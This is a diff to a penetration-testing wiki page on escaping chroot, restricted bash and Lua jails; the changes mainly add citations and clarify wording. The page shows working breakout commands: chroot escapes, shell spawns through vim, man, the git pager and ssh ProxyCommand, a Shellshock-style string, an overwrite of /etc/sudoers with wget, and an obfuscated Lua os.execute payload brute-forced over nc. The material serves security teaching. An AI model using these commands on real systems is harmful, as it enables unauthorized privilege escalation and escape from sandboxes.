@@ -9,17 +9,17 @@
 ## Chroot Escapes
 
 From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
-Usually this means that to escape you need to be root inside the chroot.
+Usually this means that to escape you need to be root inside the chroot.<sup>[[4]](#references)</sup>
 
 > [!TIP]
-> The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.<sup>[[1]](#references)</sup>
+> The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>
 
 ### Root + CWD
 
 > [!WARNING]
 > If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.
 >
-> This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.
+> This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.<sup>[[4]](#references)[[5]](#references)</sup>
 
 Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:
 
@@ -85,7 +85,7 @@ system("/bin/bash");
 ### Root + Saved fd
 
 > [!WARNING]
-> This is similar to the previous case, but in this case the **attacker stores a file descriptor to the current directory** and then **creates the chroot in a new folder**. Finally, as he has **access** to that **FD** **outside** of the chroot, he access it and he **escapes**.
+> This is similar to the previous case, but in this case the **attacker stores a file descriptor to the current directory** and then **creates the chroot in a new folder**. Finally, as he has **access** to that **FD** **outside** of the chroot, he access it and he **escapes**.<sup>[[4]](#references)[[5]](#references)</sup>
 
 <details>
 
@@ -124,7 +124,7 @@ int main(void)
 > - Run chroot in child process in a different folder
 > - In parent proc, create a FD of a folder that is outside of new child proc chroot
 > - Pass to child procc that FD using the UDS
-> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail
+> - Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail.<sup>[[5]](#references)[[6]](#references)</sup>
 
 ### Root + Mount
 
@@ -133,7 +133,7 @@ int main(void)
 > - Mounting root device (/) into a directory inside the chroot
 > - Chrooting into that directory
 >
-> This is possible in Linux
+> This is possible in Linux.<sup>[[5]](#references)</sup>
 
 ### Root + /proc
 
@@ -141,7 +141,7 @@ int main(void)
 >
 > - Mount procfs into a directory inside the chroot (if it isn't yet)
 > - Look for a pid that has a different root/cwd entry, like: /proc/1/root
-> - Chroot into that entry
+> - Chroot into that entry.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>
 
 ### Root(?) + Fork
 
@@ -149,14 +149,14 @@ int main(void)
 >
 > - Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
 > - From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
-> - This children process will find himself outside of the chroot
+> - This children process will find himself outside of the chroot.<sup>[[5]](#references)</sup>
 
 ### ptrace
 
 > [!WARNING]
 >
-> - Time ago users could debug its own processes from a process of itself... but this is not possible by default anymore
-> - Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).
+> - Whether a process can attach with `ptrace` depends on credentials, capabilities, and enabled security modules such as Yama; same-user debugging may therefore be restricted by system policy.<sup>[[8]](#references)</sup>
+> - If attachment is permitted, you could ptrace into a process and execute a shellcode inside of it ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>
 
 ## Bash Jails
 
@@ -179,7 +179,7 @@ type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2
 
 ### Modify PATH
 
-Check if you can modify the PATH env variable<sup>[[2]](#references)</sup>
+Check if you can modify the PATH env variable.<sup>[[2]](#references)</sup>
 
 ```bash
 echo $PATH #See the path of the executables that you can use
@@ -188,6 +188,8 @@ echo /home/* #List directory
 ```
 
 ### Using vim
+
+If Vim is available, set its `shell` option to a shell you can execute and invoke `:shell`.<sup>[[10]](#references)</sup>
 
 ```bash
 :set shell=/bin/sh
@@ -208,7 +210,7 @@ man man
 man '-H/bin/sh #' man
 ```
 
-If `git` is available, remember that its help output usually goes through a pager:
+If `git` is available, its `--paginate` option sends output to `less` or `$PAGER`, which is useful when a pager escape is available.<sup>[[9]](#references)</sup>
 
 ```bash
 PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
@@ -229,7 +231,7 @@ script /dev/null -c bash
 ssh localhost /bin/sh
 ```
 
-If you can only **inject arguments** into an allowed command (instead of running it freely), also check **GTFOArgs**.
+If you can only **inject arguments** into an allowed command (instead of running it freely), also check **GTFOArgs**.<sup>[[17]](#references)</sup>
 
 ### Create script
 
@@ -242,7 +244,7 @@ red /bin/bash
 
 ### Get bash from SSH
 
-If you are accessing via ssh you can often ask the server to execute a **different program** instead of the restricted login shell:
+If you are accessing via ssh you can often ask the server to execute a **different program** instead of the restricted login shell.<sup>[[14]](#references)</sup>
 
 ```bash
 ssh -t user@<IP> bash # Get directly an interactive shell
@@ -251,7 +253,7 @@ ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
 
-If `ssh` is one of the few locally allowed binaries, remember that it can also be abused as a **GTFOBin**:
+If `ssh` is one of the few locally allowed binaries, remember that it can also be abused as a **GTFOBin**; its `LocalCommand` and `ProxyCommand` options execute locally configured helper commands.<sup>[[14]](#references)[[15]](#references)</sup>
 
 ```bash
 ssh localhost /bin/sh
@@ -261,6 +263,8 @@ ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
 
 ### Declare
 
+In Bash, a nameref redirects assignments to another variable, while adding an element to `BASH_CMDS` adds that command to Bash's internal command hash table.<sup>[[11]](#references)[[12]](#references)</sup>
+
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
@@ -269,7 +273,7 @@ BASH_CMDS[shell]=/bin/bash;shell -i
 
 ### Wget
 
-You can overwrite for example sudoers file
+Wget's `-O` option writes downloaded content to the specified output file; if that path is writable, this can overwrite a file such as `/etc/sudoers`.<sup>[[13]](#references)</sup>
 
 ```bash
 wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
@@ -309,28 +313,28 @@ Tricks about escaping from python jails in the following page:
 
 ## Lua Jails
 
-In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)
+In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>
 
-**Eval with command execution:**
+The standard `load`, `string.char`, and `os.execute` functions can build and run this chunk when they are available.<sup>[[16]](#references)</sup>
 
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
 
-Some tricks to **call functions of a library without using dots**:
+A table function can also be retrieved with `rawget` instead of dot syntax.<sup>[[16]](#references)</sup>
 
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
 ```
 
-Enumerate functions of a library:
+Use `pairs` to enumerate a library table.<sup>[[16]](#references)</sup>
 
 ```bash
 for k,v in pairs(string) do print(k,v) end
 ```
 
-Note that every time you execute the previous one liner in a **different lua environment the order of the functions change**. Therefore if you need to execute one specific function you can perform a brute force attack loading different lua environments and calling the first function of le library:
+The order in which `pairs` enumerates table indices is unspecified, so do not rely on a particular function appearing first. If you need to execute one specific function, you can perform a brute force attack by loading different lua environments and calling the first function of the library.<sup>[[16]](#references)</sup>
 
 ```bash
 #In this scenario you could BF the victim that is generating a new lua environment
@@ -343,7 +347,7 @@ for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end
 for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
 ```
 
-**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell (and hopefully unlimited) calling:
+**Get interactive lua shell**: If you are inside a limited lua shell you can get a new lua shell (and hopefully unlimited) by calling `debug.debug()`, which enters an interactive mode.<sup>[[16]](#references)</sup>
 
 ```bash
 debug.debug()
@@ -354,6 +358,19 @@ debug.debug()
 - [1] [Chw00t: How To Break Out from Various Chroot Solutions (Bucsay Balazs, DeepSec talk and slides)](https://www.youtube.com/watch?v=UO618TeyCWo)
 - [2] [GNU Bash Reference Manual – The Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
 - [3] [git-shell – Git Documentation](https://git-scm.com/docs/git-shell)
+- [4] [chroot(2) – Linux manual page](https://man7.org/linux/man-pages/man2/chroot.2.html)
+- [5] [chw00t – chroot escape tool](https://github.com/earthquake/chw00t)
+- [6] [unix(7) – Linux manual page](https://man7.org/linux/man-pages/man7/unix.7.html)
+- [7] [proc_pid_root(5) – Linux manual page](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
+- [8] [ptrace(2) – Linux manual page](https://man7.org/linux/man-pages/man2/ptrace.2.html)
+- [9] [git – Git Documentation](https://git-scm.com/docs/git)
+- [10] [:shell – Vim documentation](https://vimhelp.org/various.txt.html#%3Ashell)
+- [11] [Bash Builtins – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
+- [12] [Bash Variables – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
+- [13] [GNU Wget Manual](https://www.gnu.org/software/wget/manual/wget.html)
+- [14] [ssh(1) – OpenBSD manual page](https://man.openbsd.org/ssh)
+- [15] [ssh_config(5) – OpenBSD manual page](https://man.openbsd.org/ssh_config)
+- [16] [Lua 5.4 Reference Manual](https://www.lua.org/manual/5.4/manual.html)
+- [17] [GTFOArgs: Argument Injection Exploitation Vector List](https://gtfoargs.github.io/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
